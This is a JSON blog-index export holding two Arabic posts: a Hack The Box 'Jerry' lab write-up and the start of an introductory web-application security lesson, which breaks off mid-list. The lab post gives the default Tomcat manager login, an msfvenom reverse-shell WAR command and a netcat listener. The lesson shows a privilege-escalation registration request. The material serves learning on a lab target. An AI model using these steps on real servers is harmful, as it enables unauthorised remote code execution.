[
  
  {
    "title": "HTB Jerry Lab - Arabic Hack The Box Report",
    "url": "/posts/Jerry_HTBLab/",
    "categories": "Hack_The_Box",
    "tags": "HTB_Repo, Web, Bug_Bounty, File_Upload_Attack, web_pentest",
    "date": "2025-07-28 00:00:00 +0300",
    





    
    "snippet": "1️⃣ HTB Jerry Lab - Arabic Hack The Box Report📍 Basic Information  Category: Web  Difficulty: Easy  HTB Link: HTB Academy – Jerry   Date Completed: 2025-07-28🔍 1. Recon &amp; Enumeration🌐 Target In...",
    "content": "1️⃣ HTB Jerry Lab - Arabic Hack The Box Report📍 Basic Information  Category: Web  Difficulty: Easy  HTB Link: HTB Academy – Jerry   Date Completed: 2025-07-28🔍 1. Recon &amp; Enumeration🌐 Target Information  IP: 10.10.10.95  Ports: 8080 (HTTP)  Service: Apache Tomcat  Technology Identified: Apache Tomcat  OS Guessing: Windows📄 Files / Endpoints Discovered  /docs  /manager/html  /examples🧪 Tools Used  nmap, ffuf, msfvenom🎯 2. Vulnerability Identification✅ Vulnerability Type(s)  File Upload Attack  Weak Credential🧠 Explanationاثناء فحص ال Directories وجدت صفحة تسجيل دخول manager/html وهي عبارة عن صفحة تسجيل دخول، قمت بالتسجيل بال username وال password الافتراضيين ل Tomcat، وبالفعل استطعت تسجيل الدخول.![[Pasted image 20250728212622.png]]لاحظت بصفحة ال manager وجود مكان لرفع ملف Web Application Resource (WAR) وهو ملف يحتوي على الملفات المبنية ب Java الضرورية لعمل الموقع.السماح برفع ملفات WAR وتمكين المستخدم من تشغيلها بدون تحقق من التوثيق يمثل خلل أمني يسمح بتنفيذ أوامر عن بعد RCE، وهذا يُصنف كـ Remote Code Execution.🚀 3. Exploitation🔧 Payload Usedبعد بحث خفيف على Google وجدت ان ممكن انشأ ال payload باستخدام msvenom : sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.93 LPORT=9002 -f war &gt; rev_shell.warوطبعاً لازم شغل Listener عندي باستخدام Netcat:nc -lnvp 9002🎯 Result / Effectبعد ما جهزت ال Listener وانشأت ال Payload، برفعه على الصفحة، بس ما رح يصير شي عندي لانه صح انرفع بس ما تم تفعيله، لهيك لازم اضغط على رابط ال Payload يلي تم انشائه:![[2.webp]]📎 4. Proof of Concept (PoC)💬 Steps to Reproduce:1. افتح 8080:[Your_IP] وسجل الدخول بـ:    2. بعد الدخول، انتقل مباشرة إلى /manager/html    - username: tomcat            - password: s3cret            3. لاحظ ممكن رفع ملف war.    4. انشأ payload Java وقم برفعه ثم تشغيله.    🖼 Screenshot![[3.webp]]![[4.webp]]📊 5. Impact &amp; Risk- *OWASP Category:* A08:2021 - Software and Data Integrity Failures , A05:2021 - Security Misconfiguration    - *CVSS Score:* 9.0 (Critical)    - *Impact:*      يسمح للمستخدمين غير المصرح لهم بالوصول إلى صلاحية ال Administrator    🗒 7. Lessons Learned- ضرورة تعطيل واجهات الإدارة (manager/html) أو تقييدها عبر جدار ناري داخلي.    - تقييد رفع ملفات WAR لمديرين موثوقين فقط.    - فحص ملفات WAR باستخدام AV و sandbox قبل النشر.🔗 References      HTB Academy - File Upload Attacks        OWASP A08 – Software and Data Integrity Failuresl        OWASP A05 – Security Misconfiguration  tags:#HTB_Repo , #Web , #Bug_Bounty , #File_Upload_Attack ,#web_pentest"
  },
  
  {
    "title": "Introduction to Web Applications — Arabic HackThe Box ACADEMY Walkthrough",
    "url": "/posts/Introduction_to_Web_Applications/",
    "categories": "Hack_The_Box_Academy",
    "tags": "Bug_Bounty_Hunter, PenetrationTesting, Security, Hacker",
    "date": "2025-05-19 00:00:00 +0300",
    





    
    "snippet": "  HTB Academy الدرس على مرحبا يا هكرجية👨🏻‍💻، انا فاروق واليوم رح نحكي مقدمة عن تطبيقات الويب ورح نشرح كلشي بال Module من HTB. الفكرة انو هالشي عم ياخد وقت وجهد كبير بس انا ماشي على مبدئ زكاة العلم ...",
    "content": "  HTB Academy الدرس على مرحبا يا هكرجية👨🏻‍💻، انا فاروق واليوم رح نحكي مقدمة عن تطبيقات الويب ورح نشرح كلشي بال Module من HTB. الفكرة انو هالشي عم ياخد وقت وجهد كبير بس انا ماشي على مبدئ زكاة العلم نشره وعسى يكون صدقة جارية لأهلي لهيك بس يلي رح اطلبه منك تتذكرنا بدعوة من قلبك وكمان تنشر العلم مع اي حدا مهتم بالمجال وبالتوفيق يارب❤️. إن اخطأت فمن نفسي وإن اصبت فمن الله✨Introduction to Web Applications📌 Introduction:  ال Web Application هي عبارة عن برامج بتشتغل داخل المتصفحات متل Firefox,Chrome وبتعتمد على شي اسمو  client-server architecture.  العميل (Client): هو المتصفح يلي المستخدم بشوف فيه واجهة التطبيق (Front-end) متل التصميم ولون الأزرار وشكل الصفحة...  الخادم (Server): هو جزء ال Back-end، موجود فيه الكود تبع التطبيق وقواعد البيانات.  الترتيب هاد بخلي الشركات بتقدر تستضيف تطبيقات قوية تتحكم فيها بشكل مباشر وتكون متاحة للناس بكل العالم، متل خدمات البريد من Google، المتاجر الالكترونية متل Amazon، برامج تحرير النصوص متل Google docs  وهالشي مو مقتصر عالشركات الكبيرة فقط لانو اي Web Developer بيقدر يعمل Web Application ويستضيفه عبر خدمات الاستضافة العادية، وهاد السبب انو في ملايين الWeb Applications ومليارات المستخدمين.  🔵 Web Applications vs. Websitesسابقاً، كانت المواقع مملة وجامدة (static)، يعني محتواها ثابت وحتى يتغير لازم المبرمج يدخل عالكود ويضيف عليه يدويا.يعني مثلا عنا موقع بيعرض معلومات شركة، فهي المعلومات رح تضل ثابتة ومابتتغير اذا حاول المستخدم يتفاعل معها، هي المواقع منسميها Web 1.0، وهي متل ماحكينا بتعرض المعلومات كأنك عم تقرأ جريدة ومابتقدر تغير شي حتى تغيره المطبعة.  اما اليوم معظم تطبيقات الويب بتستعمل شي اسمو Web 2.0 وهي التطبيقات بتعرض محتوى متغير (Dynamic) وبيتغير حسب تفاعل المستخدمين معه.يعني مثلا مثلا لما نفتح اليوتيوب ونضغط على اي زر فالمحتوى قدامي بيتغير حسب الزر يلي كبسته.وكمان من مميزاتها انها بتشتغل على كل انواع الشاشات يعني مابهم اذا بفتح التطبيق من موبايل او لابتوب او PC كلو شغال وكمان بتشتغل على اي نظام تشغيل OS.🔵 Web Applications vs. Native Operating System ApplicationsNative OS Applicationsهي البرامج يلي بتتثبت على جهازك، متل برامج مايكروسوفت او الألعاب يلي بتشتغل عالويندوز أو الماك. اما الWeb Applicationsفهي مختلفة شوي وعندها اكتر من ميزة.ال Web Application مستقلة عن نظام التشغيل، يعني بتشتغل على اي نظام تشغيل بغض النظر عن نوعه (ويندوز,ماك او حتى لينكس)وكمان مافي داعي ثبت ال Web Application على جهازي، لأنها بتشتغل على Server بعيد، لهيك مافي داعي خزن مساحة على الهارد تبع المستخدم.وبالإضافة لهالأمور بال Web Application الإصدار موحد للكل، يعني كل المستخدمين عندهم نفس نسخة الإصدار للتطبيق، وبتم تحديثه على ال Server بدون الحاجة للإرسال تحديثات للمستخدم. وهالشي بقلل تكاليف الصيانة والدعم.بس كمان ال Native OS Applications في الها إيجابيات متل انها اسرع لأنها بتستخدم ملفات ومكتبات موجودة عالنظام والأجهزة المحلية، وكمان عندها قدرات افضل لانها بتستخدم موارد الجهاز بشكل اعمق بكتير مقارنة بتطبيقات الويب يلي بتعتمد على امكانيات المتصفح.آخر كم سنة طلع عندي شي اسمهHybrid and Progressive Web Appsوهاد عبارة عن دمج لمميزات التنين فهي بتستخدم أطر عمل حديثة وبتعمل بسرعة اكبر وبتستفيد من موارد الجهاز.في لل Web Applications نوعين رئيسيين:مفتوحة المصدر (Open Source):اي شخص ممكن يدخل عالكود تبعها ويعدل عليها لتلبي احتياجه، وهي يلي بتفضله الشركات لانها بتقدر تعدل عليها حسب شو بناسبها، امثلة عنها:  WordPress: لإنشاء المواقع والمدونات  OpenCart: لإنشاء المتاجر الإلكترونية  Joomla: لإدارة المحتوىمغلقة المصدر (Closed Source):وهي يلي بتطورها الشركات وبتبيعها، او بتسمح باستخدامها بإشتراك، متل:  Wix: لإنشاء المواقع  Shopify: لإنشاء متاجر إلكترونية  DotNetNuke: لإدارة المحتوى🔵 Security Risks of Web Applicationsبما انو ال Web Applications ممكن الوصول اليها من اي مكان بالعالم بمجرد مايكون عندك اتصال بالانترنت فهالشي سمح لأي شخص لأي شخص انو يقدر يهجم عليها، وكل ما كان ال Web Application اكبر ومعقد اكتر كل ما زاد احتمال انو يكون عندي فيها مشاكل امنية، وخاصة انو عندي أدوات تلقائية لمسح وفحص ومهاجمة ال Web Applications، ولما الهاكر يستخدم هالأدوات رح يسببلي مشاكل ومخاطر كبيرة.اذا فرضا الهاكر قدر يخترق ال Web Application بسبب خسائر مالية وبتتوقف الأعمال وممكن يصير تسريب لبيانات حساسة متل معلومات العملاء والشركات، لأنه غالبا ال Web Applications بترتبط ب Servers وبقواعد بيانات بتحتوي على هدول المعلومات.لهيك ضروري عالشركات انو تختبر تطبيقاتها مشان تكتشف الثغرات وتحاول إصلاحها بسرعة قبل ما الهكر يكتشفها🌚، ولازم تعتمد على مبدئ ال Secure Coding، واكيد لازم تتأكد انو اصلاح الثغرات ما يفتح ثغرات جديدة(يعني بالله شو استفدنا لم نصلح ثغرة بس نفتح وحدة غيرها😂🤦‍♂️)بالنسبة لاخبار اختراق ال Web Applications، اسمها Web Application Penetration Testing، وهي مهارة لازم الشخص يلي بدو يشتغل بالمجال يكون بيعرف كيف بيشتغل ال Web Application بالأصل لأنو مافيك تخترق شي مابتعرف كيف بيشتغل🌚، ولازم نتعلم كيف بتم تطوير ال Web Applications وشو هي المخاطر الخاصة بكل طبقة وبكل مكون من مكونات التطبيق حسب شو التقنيات المستخدمة.وحدة من الطرق المستخدمة كتير هي استخدام دليل OWASP، وهو مرجع عالمي بال Web Penetration Testing.وحدة من الإجراءات المشهورة هي انو نبلش بالتأكد من امان ال Front end ونراجع كود ال HTML, CSS, Java Script وهنن اللغات المشهورة يلي بتم من خلالهم بناء ال Web Applications، فمنتأكد انو الكود مكتوب بطريقة Secure ومنحاول ندور على نقاط ضعف متل Sensitive Data Exposure وهي مهاجمة البيانات الحساسة لل Web Application وبسبب اختراق لكل البيانات يلي لازم تنحمى، وال  Cross-Site Scripting (XSS) بتسبب انو المهاجم بيقدر يوصل برامج خبيثة لل Web Application أو سرقة ال Sessions.ولايهمك اذا مافهمت كتير، رح نحكي عنهن بالتفصيل لقدام لساتنا بالمقدمة حاليا🫠بعد ما نراجع كل المكونات الاساسية بال Front end منرجع ومنتأكد من باقي الوظائف الخاصة بال Web Applicatoin واتصاله بالسيرفرات وبدور عالمشاكل او الثغرات بالسيرفر.وعادةً منقيم ال Web Application كشخص خارجي وكشخص داخلي، يعني مثلا عندي موقع بيتطلب تسجيل دخول، بشوف النتائج مرة بدون ما يكون عندي حساب ومرة وانا عندي حساب مشان اعمل مراجعة لكل السيناريوهات المحتملة عندي.🔵 Attacking Web Applicationsمعظم الشركات بغض النظر عن حجمها عندها Web Applicatoin خاص فيها، بدايةً من الشغلات البسيطة متل ال Static وصولا لمدونات كبيرة بتشتغل بأنظمة إدارة المحتوى متل WordPress, وصولا لانظمة كبيرة فيها تسجيل دخول وادوار للمستخدمين (متل مستخدم عادي وادمن و...)وبسبب طبيعتها ال Dynamic بتتغير هالتطبيقات باستمرار، واي تغيير بسيط ممكن يودي لظهور ثغرات خطيرة.موجود العديد من الثغرات الخطيرة يلي ممكن تطلع عندي، وحدة منهن هي الSQL Injectionبتصير لما حدا يتعامل مع طلبات المستخدم بشكل غير آمن، وهالشي بيسمح للمهاجم بالوصول لقاعدة البيانات وقراءة الملفات او حتى تنفيذ اوامر على السيرفر.    ✅ ملاحظة: حكينا عن ال SQL Injection بدرس تاني بالتفصيل بتقدر ترجع تشوفها وهي اللينك تبعها SQL Injectoinالثغرة يلي بعدها هيFile Inclusionوهي بتسمح للمهاجم بقراءة Source Code (الكود تبع التطبيق) حتى اوصل لصفحات او لملفات مخفية وهيك بقدر اكشف وظائف مخفية مو مصرح الي اني اوصلها وممكن تؤدي لتنفيذ أوامر عن بعد.بعدين بيجي عنا ال Unrestricted File Uploadوهي لما بيسمح التطبيق برفع الملفات بدون تحقق (مثل لما يكون التطبيق بيسمح الي اني ارفع صورة فبرفع برنامج ضار بدلاً من صورة)، وهيك ممكن للمهاجم السيطرة على ال server.وبعدين بيجي عنا الInsecure Direct Object Referencing (IDOR)وهي لما بيقدر المستخدم انو يوصل لبيانات أو وظائف بتخص مستخدمين آخرين. على سبيل المثال، إذا كان في رابط لتعديل ملفك الشخصي مثل /user/701/edit-profile، يمكن للمهاجم تغيير الرقم إلى 702 لتعديل ملف مستخدم آخر.آخر الشي عنا الBroken Access Controlالنظام عندي هو المسؤول عن تحديد الصلاحيات للمستخدمين، بس لما يصير عندي خطأ بالتنفيذ المهاجم ممكن يستغل هالشي ويوصل لمكان مو مسمحله يوصله.مثلاً عندي موقع بيسمح لأي شخص يعمل حساب جديد وبيطلب منه اسم المستخدم وكلمة السر والإيميل بس المشكلة انو بيبعت كمان rolied وهاد رقم بمثل صلاحية الحساب يعني مثلا rolied=3 يعني الحساب لمستخدم عادي، اما اذا كانت rolied=1 فالمستخدم ادمن، واذا كانت rolied=0 بكون صاحب النظام وهاد اعلى من الأدمن.واي حدا بدو يعمل حساب جديد الموقع بيرسل عالسيرفر هاد الطلبPOST /registerusername=bjones&amp;password=Welcome1&amp;email=bjones@domain.com&amp;roleid=3فهون المهاجم صار يفكر ليش ما غير ال rolied=3 ل rolied=1?وصار عندي الطلب هيك:POST /registerusername=hacker&amp;password=123456&amp;email=hacker@evil.com&amp;roleid=1والمفاجأة؟ 😏إذا ما كان في تحقق منيح بالسيرفر، الموقع رح يسجل الحساب كـ ادمن مباشرة!!الموقع عطاك صلاحيات مو من حقك بس لأنك غشيت برقم صغير، وهالشي بسبب إنو مافي تحقق حقيقي من السيرفر على صلاحية المستخدم.مثال واقعي:اذا كان عندي تطبيق ويب بيستخدم شي اسمه Active Directory لتسجيل الدخول للمستخدمين، ممكن لثغرة ال SQL Injection انو تسمح للهاكر باستخراج ايميلات المستخدمين وبقدر استخدم هالايميلات بهجوم Password Spraying (بحاول بكلمات السر المشهورة على كتير حسابات) ضد بوابات ال VPN او حتى الايميلات وهالشي بيسمحلي اوصل للبيانات الحساسة او حتى اني اخترق الشبكة الداخلية للشركة.لا تخاف اذا حسيت اي شي من الحكي يلي حكيناه صعب، لانو رح نحكي عليهن لقدام بالتفصيل إن كان بهاد الدرس او بالدروس القادمة، ورح تصير تلاقيهن شوربة (شوربة = بغاية السهولة😂)لهيك يلا يا بطل خلينا نكمل وما نوقف هون وتذكر انو لازم تحس حالك غبي انت وعم تدرس حتى تصير عبقري🔥...📌 Web Application Layout:  كل Web Application موجود مختلف عن التاني، لأن كل شركة بتبني التطبيق الخاص فيها بناءً على احتياجاتها والجمهور يلي بتستهدفه، لهالسبب تطبيقات الويب بتختلف بطريقة برمجتها وتصميمها والبنية التحتية متل السيرفرات والأنظمة يلي بتدعمها.  ولنفهم تطبيق الويب لازم نعرف 3 اشياء رئيسية:  1- البنية التحتية (Infrastructure):  يعني الأجهزة والسيرفرات يلي بتشغل التطبيق، متل قاعدة البيانات (Database) أو السيرفر المستضيف لل Web Application.  2- مكونات التطبيق (Components):  وبتتألف من الأجزاء يلي بيتكون منها التطبيق، متل واجهة المستخدم(Frontend) والمكونات يلي بيتفاعل معها.  3- هندسة التطبيق (Architecture):  عبارة عن العلاقة بين كل هالمكونات مع بعضها وكيف بتتفاعل مع بعض.🟢 Web Application Infrastructure  البنية التحتية هي متل حجر الأساس يلي بقوم عليه ال Web Application، متل ماحكينا تطبيقات الويب بحاجة سيرفرات وقواعد بيانات عشان تشتغل، وفي أربع طرق رئيسية لبناء هالعملية:  Client-Server  One Server  Many Servers - One Database  Many Servers - Many DatabasesClient-Server  هاد اشهر Model، واغلب تطبيقات الويب بتستخدمه    الفكرة من هال Model انو بكون عندي Server (جهاز كمبيوتر قوي)، والمستخدمين بيدخلو لهالسيرفر من خلال متصفح الانترنت على اجهزتهم (كمبيوتر او موبايل...)  وهاد ال Model بقسم التطبيق لجزئين:  Front-End:  وهو عبارة عن الشي يلي بتشوفه بالمتصفح، متل الأزرار والنصوص وهاد الجزء بيتنفذ على المتصفح بجهازك.  Back-End:  هون السيرفر هو يلي بيتعامل مع الطلبات، متل تسجيل الدخول او إضافة منتج على عربة التسوق مثلاً، السيرفر بياخد طلبك وبعالجه وبعدين برد عليك بالنتيجة.  مثال واقعي:  لما العميل يزور عنوان URL ل Web Application ولنفرض مثلا انه Facebook.com بيستخدم السيرفر واجهة التطبيق الرئيسية UI.  ولما المستخدم يضغط على زر او يطلب وظيفة معينة، بيرسل الويب HTTP Request للسيرفر، والسيرفر بفسر هالطلب وبنفذ المهام اللازمة لإكمال الطلب.  يعني اذا فتت عالفيسبوك وكتبت ايميلك وكلمة السر وضغطت على Login، الويب بيرسل ال HTTP Request للسيرفر وبقوم السيرفر بمطابقة الايميل وكلمة السر مع قاعدة البيانات يلي عنده وبعدها بيرجع بأرسل HTTP Response للمتصفح الخاص فيك وبقوم بتحويلها للغة مقروءة وبيعرضلك صفحتك الشخصية.One Server  هون كلشي (التطبيق وقاعدة البيانات  وكلشي) موجود على سيرفر واحد وهاد model بسيط وسهل تنفيذه بس خطير!  ليش؟ لأنك بتكون حاطت كل البيض تبعك بسلة وحدة وإذا تم اختراق اي تطبيق، فبتكون كل بياناتك معرضة للإختراق، ولو السيرفر وقف عن العمل (وقع) كل التطبيقات بتصير غير متاحة.  Many Servers - One Database  هون قاعدة البيانات على سيرفر منفصل، والتطبيقات على سيرفرات تانية.  يعني لو في أكتر من تطبيق، كلهم يتشاركون نفس قاعدة البيانات.الميزة هون لو سيرفر واحد اتعرض للاختراق، الباقي ما يتأثر بشكل مباشر.ولو قاعدة البيانات اتعرضت لمشكلة، التطبيق نفسه ما يتأثر مباشرة،بس لازم يكون في تحكم صارم بالأشخاص يلي تقدر تدخل على البيانات.  Many Servers - Many Databases  هاد أكتر نموذج متقدم. كل تطبيق ويب عنده قاعدة بيانات خاصة فيه، وكل قاعدة بيانات على سيرفر منفصل.  الميزة عندي أمان عالي جدًا، لأن البيانات مفصولة، ولو في مشكلة بسيرفر أو بقاعدة بيانات، الباقي بيبقى شغال.  بيستخدموه كتير عشان التكرار (Redundancy)، يعني لو سيرفر وقف، في سيرفر احتياطي بيشتغل بداله.  بس هاد ال model معقد وبيحتاج أدوات متل \"Load Balancers\" عشان يوزع الطلبات بين السيرفرات.  🟢 Web Application Components  ال Web Application بيتكون من اجزاء، بغض النظر عن ال model المستخدم، وهي اهم الأجزاء:  1- Client:  وهاد جهازك، الموبايل او الكمبيوتر والمتصفح يلي بيستخدمه  2- Server:  بيتضمن:    &nbsp;&nbsp;&nbsp;&nbsp;Web Server: يستضيف التطبيق وبرد على طلباتك.    &nbsp;&nbsp;&nbsp;&nbsp;Application Logic: البرمجة يلي بتحدد شو يصير وقت تضغط على زر معين مثلاً (Backend)    &nbsp;&nbsp;&nbsp;&nbsp;Database: المكان اللي تتخزن فيه البيانات متل بيانات حسابك.  3- Services:  الخدمات الخارجية(دفع PayPal) أو الخدمات الداخلية بين التطبيقات.  4- Functions:  هي بتطبيقات ال Serverless، يعني التطبيق بيشتغل من غير ما تحتاج تدير السيرفرات بنفسك متل خدمات AWS.  🟢 Web Application Architecture  نحنا شفنا المكونات او الأجزاء الخاصة بال Web Application، طيب السؤال حالياً، كيف بدو يكون ترتيب هالمكونات يعني اكيد ما رح يكون عشوائي؟ وكيف هالمكونات بتتفاعل مع بعض؟  بالعادة ال Web Application بتنقسم لعدة طبقات:  1- طبقة العرض(Presentation Layer):  وهي عبارة عن الواجهة يلي بتشوفها بالمتصفح(HTML, CSS, JavaScript) وهي مسؤولة عن عرض الموقع بشكل مرتب وسهل.  2- طبقة التطبيق(Application Layer):  وهالطبقة مسؤولة عن معالجة الطلبات، يعني لما تطلب شي، السيرفر بيتحقق من الصلاحيات وبعالج الطلب.  3- طبقة البيانات (Data Layer):  هون بتتخزن البيانات وبتستدعى من قاعدة البيانات عحسب الحاجة.  وهي مثال عن البنية الهندسية لل Web Applicatoin من مايكروسوفت:  🟢 Microservices  الميكروسيرفيسز هي متل قطع صغيرة من التطبيق، كل قطعة مسؤولة عن مهمة معينة مثلاً، عنا متجر إلكتروني موجود فيه اكتر من قطعة في قطعة لتسجيل الحسابات، وقطعة للبحث عن المنتجات وقطعة للدفع، وكل قطعة بتكون مستقلة لحالها، بس بتقدر القطع انها تحكي مع بعض.  والميزة بهالشي إنها مرنة، يعني لو بدي ضيف ميزة جديدة مافي داعي اني غير بالتطبيق كله.🟢 Serverlessفي نموذج حديث اسمه Serverless، يعني ما تحتاج تدير السيرفرات بنفسك. شركات متل Amazon أو Google بتوفر لك بنية جاهزة، والتطبيق يشتغل في بيئة \"افتراضية\" من غير ما تهتم بصيانة السيرفرات، وهالشي بوفر وقت وجهد.🟢 Architecture Securityكتير ضروري انك تفهم البنية العامة لل Web Application وكمان مهم أنك تفهم البنية العامة لكل تطبيق قبل ما تجرب تعمل اختبار اختراق،لانه كتير اوقات الثغرات ما بتكون عبارة عن خطأ ببرمجة ال Web Application، بس بتكون عبارة عن خطأ بتصميم بنية التطبيق.تخيل عنا تطبيق ويب (موقع تسوق إلكتروني مثلا) وكل الوظائف الأساسية فيه (متل إضافة منتج لعربة التسوق أو تسجيل الدخول) مبرمجة بشكل آمن، يعني مافي أخطاء برمجية واضحة بالكود.لو التصميم ما بيحتوي على إجراءات تحكم بالوصول (Access Control) بشكل صحيح، ممكن يحصل مشكلة كبيرة، وممكن اي مستخدم عادي يقدر يوصل لصلاحيات الآدمن.إجراءات تحكم الوصول هي القواعد اللي بتحدد مين يقدر يشوف أو يستخدم إيش في التطبيق.مثال تاني تخيل إنك هاجم على تطبيق واستغليت ثغرة (يعني اخترقت ال Back-End Server). بس لما حاولت تدور على قاعدة البيانات (اللي فيها بيانات المستخدمين متل الأسماء وكلمات المرور)، ما لقيتها! ليه؟ لأن قاعدة البيانات موجودة على سيرفر منفصل مو على نفس السيرفر اللي اخترقته. وهاد مثال على تصميم جيد من ناحية الأمان، لأن فصل قاعدة البيانات عن السيرفر الرئيسي بيقلل من الضرر لو سيرفر واحد اتعرض للاختراق.هاد هو السبب أنه يجب مراعاة الأمان بكل مرحلة من مراحل تطوير تطبيقات الويب ، ويجب عمل اختبارات الاختراق بكل دورة حياة تطوير تطبيقات الويب. 📌 Front End vs. Back End:اكيد كلنا سمعنا بمبرمج Front end او مبرمج Back end وال Full stack، وهاد البني ادم يلي بيشتغل فرونت وباك😎كل واحد من هدول المصطلحات بركز على جانب من تطوير ال Web Application، ورح نحكي عن كل وحدة لحال.🟣 Front End  وهي بتكون عبارة عن واجهة التطبيق وهي الجزء يلي بيتفاعل معه المستخدم بشكل مباشر من خلال المتصفح، ومنسميها احياناً ال Client Side، وهاد الجزء بيتكون من الاجزاء يلي منشوفها لما نزور اي تطبيق ويب وبتضمن:  1- HTML:  لغة الترميز يلي بتحدد هيكلية الصفحة، متل عناوين ونصوص وروابط وصور.  2- CSS:  لتنسيق الصفحات، يعني لتحديد الالوان ونوع الخط المستخدم وتنسيق ال HTML بشكل عام.  3- JavaScript:  وهي لغة البرمجة المسؤولة عن انها تضيف التفاعل على الصفحة، متل النوافذ المنبثقة، الأزرار يلي بتستجيب للنقر، أو تحميل البيانات ديناميكيًا، يعني هي العصب تبع الموقع يلي بتخليه قابل للتفاعل ومو جامد متل ماحكينا سابقاً.  وكل هالمكونات يلي بتشكل ال Front end بتتنفذ بالوقت الفعلي بالمتصفح يلي بتستخدمه، وهالشي يعني انو كلشي بتشوفه وبتتفاعل معه على الشاشة هو جزء من ال Front end.مبرمج ال Front end عنده عدة وظائف لازم يطبقها بكل Web Application، بداية من إنشاء العناصر الأساسية متل العناوين (Headings) والنصوص (Text) والصور (Images)، وكمان مسؤول عن التصميم والتنسيق والتحكم بشكل الصفحة وجماليتها باستخدام CSS، وايضا بكون مسؤول عن الوظائف التفاعلية وبحدد وظيفة كل جزء بالصفحة باستخدام JavaScript، متل تحديث محتوى الصفحة بدون إعادة تحميلها.وبسبب هالوظائف في كمان تحديات لمبرمج ال Front end، متل مامنعرف ال Web Applications الجديدة لازم تكون مكونات ال Front end متوافقة مع كل انواع واحجام الشاشات ومع كل انواع المتصفحات والأجهزة (يعني تخيل عندي موقع بيشتغل على ال Chrome بس مابيشتغل على ال Firefox🤦‍♂️)اذا ال Front end مو مبرمجة بشكل جيد، فهالشي ممكن يسببلي بطئ بالتطبيق وهالشي ممكن يخلي المستخدمين يعتقدوا المشكلة بالServer بس هي بال Client Side.بالإضافة لكل هالأمور عندي لسا وظائف لل Front end (مشان ما تفكر شغلتو سهلة وتقول عنه نقاش🌚)، عنا اول شي تصميم المفهوم (Visual Concept Web Design) يعني إنشاء التصور الأولي لشكل الموقع، ومسؤول كمان عن تصميم واجهة المستخدم (User Interface-UI) وهو تصميم العناصر يلي بيتفاعل معها المستخدم متل الأزرار والقوائم، وآخر الشي تصميم تجربة المستخدم (User Experience-UX) وهي تحسين تجربة المستخدم بحيث تكون سهلة ويكون التطبيق سلس بالأستخدام.مثال عملي:في كتير محررات نصوص على الانترنت ممكن نستخدمها حتى نطبق عملي على الشي يلي تعلمنا متل: Editorبتقدر بالبداية تجرب تحط هالكود:&lt;p&gt;&lt;strong&gt;Welcome to Hack The Box Academy(Hack With Farouk Academy🌚)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;em&gt;This is some italic text.&lt;/em&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=\"color: #0000ff;\"&gt;This is some blue text.&lt;/span&gt;&lt;/p&gt;هاد الكود البسيط بيظهر نص غامق (Bold) باستخدام وسم strong ونص مائل باستخدام وسم emونص ملون بالأزرق باستخدام خاصية style في ال css لما ندخل هاد االكود بالمحرر منقدر نشوف النتيجة مباشرة، ومنقدر نعدل على التنسيقات (متل تغيير الألوان او إضافة عناوين) وشوف كيف بتتغير الصفحة. 🟣 Back Endوهو الجزء بال Web Application يلي بيشتغل على ال Server Side، ومسؤول عن تشغيل كل الوظائف الاساسية للتطبيق وهاد الجزء يلي ما بشوفه المستخدم وما بيتعامل معه بشكل مباشر بس بكون ضروري لتشغيل ال Web Application وبدونه ال Web Application بكون مجرد صفحات ثابتة يلي ما بتحتوي على اي وظائف (حسيته باتمان، مابتشوفه ولا بتتعامل معه بس مابتقدر بلاه😎)تتألف ال Back end من اربع مكونات اساسية:- Back End Servers  : وهي عبارة الأجهزة المادية وأنظمة التشغيل يلي بتستضيف كل مكونات ال Back end، وبتعتمد غالباً على انظمة تشغيل متل Windows, Linux او باستخدام حاويات (Containers) متل Docker.- Web Servers : مسؤولة عن معالجة طلبات HTTP وعن التوصيلات بين ال Client Side وال Server Side امثلة عنها: Apache، NGINX، وIIS.- Databases : بستخدمها لخزن فيها واسترجع منها بيانات التطبيق، وفي الها نوعين Relational Databases متل MySQL، MSSQL، Oracle، PostgreSQL وال Non-Relational Databases متل MongoDB، NoSQL.- Development Frameworks : بيستخدمها المبرمج لتطوير التطبيق الأساسي متل ال Laravel (PHP)، ASP.NET (C#)، Spring (Java)، Django (Python)، Express (NodeJS JavaScript)..    ✅ ملاحظة: طبعا رح يتم شرح كلشي بالتفصيل إن كان بهاد الدرس او بالدروس القادمة بس عم ناخد نظرة عامة عن تطبيقات الويب حالياً.  ممكن انو نستضيف كل المكونات ال Backend على Server منفصل أو ب Containers معزولة باستخدام تقنيات متل ال Docker، وهاد الفصل بساعد بعزل المكونات بحيث انه تكون قاعدة البيانات بحاوية منفصلة عن التطبيق الرئيسي وهالشي بقلل من تأثير الثغرات الأمنية، وكمان بساعد بتحسين الأمان بحيث إذا انصابت وحدة من الحاويات بثغرة ما بتتأثر باقي الحاويات، وكمان رح تكون اوفر من اني حط كل مكون على Server منفصل.حكينا عن المهام الاساسية لل Front end ورح نحكي هلق عن مهام ال Back end:اول شي بناء الوظائف الاسياسية يلي بتخلي التطبيق يعمل وتطوير الكود المسؤول عن إدارة سلوك التطبيق، وايضا تطوير وصيانة قواعد البيانات، ومسؤولة عن إنشاء المكتبات البرمجية يلي بيستخدمها التطبيق وتنفيذ المتطلبات يلي بيحتاجها التطبيق، وتطوير ال APIs لتسهيل التواصل بين ال Front end وال Back end، ودمج الخدمات السحابية.🟣 Securing Front/Back Endصح انو غالبا ما منقدر نوصل للكود المصدري (Source Code) الخاص بال Back end حتى نحلله مباشرة بس تطبيقات الويب ابدا مو محصنة ضد الهجمات على سبيل المثال:- هجمات الحقن (Injection Attacks)  : متل حقن SQL، الهاكر بيتلاعب باستعلامات قاعدة البيانات حتى يوصل لبيانات من غير المسموح انه يوصلها..- هجمات تنفيذ الأوامر (Command Injections)  : المهاجم بنفذ أوامر نظام التشغيل من خلال ال Web Application.وعنا نوعين من اختبارات امان التطبيقات، اول شي الWhitebox Pentesting لما يكون عندي وصول لل Source Code تبع التطبيق وبقدر اعمل Review على الكود تبع التطبيقالنوع التاني هو الBlackbox Pentesting وهون مابكون عنا وصول لشي ومنعمل الاختبار بدون معرفة التفاصيل الداخلية، ومع هيك، إذا كان التطبيق مفتوح المصدر، أو إذا قدرنا نحصل على الكود عبر ثغرات متل تضمين الملفات المحلية (Local File Inclusion)، منقدر نراجع الكود حتى نعثر على بيانات حساسة (مثل كلمات المرور) أو ثغرات.رح نحكي هلق عن أهم 20 خطأ بيعمله المبرمجين وبسبب ثغرات امنية، رح نحكيهن حالياً بدون شرح ورح نشرحهن اكتر مع الوقت:1- السماح بإدخال بيانات غير صالحة إلى قاعدة البياناتوهالشي بصير لما 